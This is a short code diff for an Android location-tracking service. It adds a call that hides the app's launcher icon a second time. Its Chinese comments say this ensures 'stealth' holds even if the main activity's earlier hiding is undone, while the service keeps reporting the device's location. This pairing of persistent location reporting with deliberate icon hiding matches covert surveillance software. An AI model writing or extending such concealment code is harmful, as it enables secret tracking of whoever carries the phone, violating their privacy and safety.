@@ -60,13 +60,18 @@ public class TrackingService extends Service implements LocationListener {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         startForegroundNotification();
 
+        // 兜底隐藏一次桌面图标（第二道保障）：
+        // 服务是常驻的，不受 MainActivity 生命周期影响，即使 MainActivity 的隐藏被系统回滚，
+        // 这里也会再隐藏一次，确保隐身生效。
+        handleIconVisibility(true);
+
         // 1. 先发起一次单次定位，拿到结果或超时后再上报（避免冷启动时上报 0,0）
         requestSingleLocationAndReport();
 
         // 2. 注册网络状态变动监听（Wi-Fi 跨网即时插队上报）
         registerNetworkCallback();
 
-        // 3. 启动持续定位监听（不在这里安排定时上报，由 requestSingleLocationAndReport 触发首次后接管）
+        // 3. 启动持续定位监听（定时上报由首次上报后接管）
         startLocationUpdates();
     }
 
